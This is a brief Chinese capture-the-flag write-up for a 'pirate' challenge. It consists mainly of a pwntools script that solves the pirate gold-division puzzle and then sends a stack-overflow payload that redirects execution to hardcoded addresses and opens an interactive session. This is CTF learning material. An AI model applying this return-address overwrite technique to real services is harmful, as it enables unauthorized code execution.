## 考点

代码审计/信息检索+栈溢出

## 工具

python3

## 步骤

```python
from pwn import *
context.log_level='debug'
context.arch='amd64'
context.os='linux'

#p=process('./pirate')
#gdb.attach(p)
p=remote('0.0.0.0','8080')
p.recvuntil(b'Boom~! You are a pirate, and now you and ')
n=int(p.recvuntil(b' ')[:-1].decode())+1
p.recvuntil(b'other pirates have ')
m=int(p.recvuntil(b' ')[:-1].decode())
coins=m-(n-1)//2
p.sendlineafter(b'How many coins you will give to pirate No.1:',str(coins).encode())
for i in range(2,n+1):
    if ((n+1-i)&1)==(n&1):
        p.sendlineafter(b':',b'1')
    else:
        p.sendlineafter(b':',b'0')
p.sendlineafter(b'Now you can give all of your gold coins to me, and say something.\n',p64(0)*2+p64(0x401621)+p64(0x401236))
#pause()
p.interactive()
```

## 总结

海盗分金问题
